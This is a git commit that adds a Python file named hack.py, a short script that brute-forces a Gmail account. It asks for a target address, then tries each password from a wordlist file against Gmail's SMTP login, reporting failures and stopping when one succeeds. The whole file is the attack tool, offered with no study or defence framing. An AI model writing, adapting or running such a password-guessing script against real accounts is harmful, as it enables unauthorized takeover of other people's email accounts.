1c0899078d22d0ee8fe13f7b13b3217fad2d5038
Rizwan Abdul Rahim <73348960+XEn0CidE@users.noreply.github.com>
2021-02-18 16:05:19 +0530

    master

---
+++ hack.py
@@ -0,0 +1,25 @@
+import smtplib
+import art
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter The Target Gmail Address => ")
+
+print("\n")
+
+passswfile="acid burn.txt"
+
+passswfile = open(passswfile, "r")
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[!] Password Found = %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print(":-( Password Is Wrong = %s " % password)
+
